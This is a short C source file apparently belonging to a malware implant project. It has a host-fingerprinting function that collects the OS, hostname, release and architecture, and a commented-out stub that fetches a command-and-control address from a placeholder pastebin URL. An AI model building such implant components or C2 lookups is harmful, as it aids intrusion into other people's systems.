#include "implant_utils.h"

//#include <curl//curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#elif __linux__ || __APPLE__
#include <sys/utsname.h>
#endif

char *operating_system_info()
{
    char *os_info = malloc(512);

#ifdef _WIN32
    // Windows specific
    OSVERSIONINFO version;
    version.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&version);
    snprintf(os_info, 512, "Windows | %lu.%lu",
             version.dwMajorVersion,
             version.dwMinorVersion);

#elif __linux__ || __APPLE__
    // Unix/Linux/Mac
    struct utsname info;
    uname(&info);
    snprintf(os_info, 512, "%s | %s | %s | %s",
             info.sysname,
             info.nodename,
             info.release,
             info.machine);
#else
    snprintf(os_info, 512, "Unknown OS");
#endif

    return os_info;
}

// char *fetch_c2_address()
// {

//     CURL *curl = curl_easy_init();

//     // 2. set options
//     curl_easy_setopt(curl, CURLOPT_URL, "https://pastebin.com/raw/yourpaste");

//     // 3. perform the request
//     curl_easy_perform(curl);

//     // 4. cleanup
//     curl_easy_cleanup(curl);
// }